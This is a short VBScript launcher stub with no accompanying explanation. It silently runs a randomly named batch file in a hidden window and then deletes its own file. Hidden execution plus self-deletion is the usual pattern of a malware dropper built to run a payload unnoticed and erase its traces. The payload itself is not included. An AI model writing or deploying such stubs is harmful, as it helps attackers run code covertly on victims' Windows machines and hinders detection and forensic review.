Set oShell = CreateObject ("Wscript.Shell")
oShell.Run "AvDtNFjjgD.bat", 0, false
Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True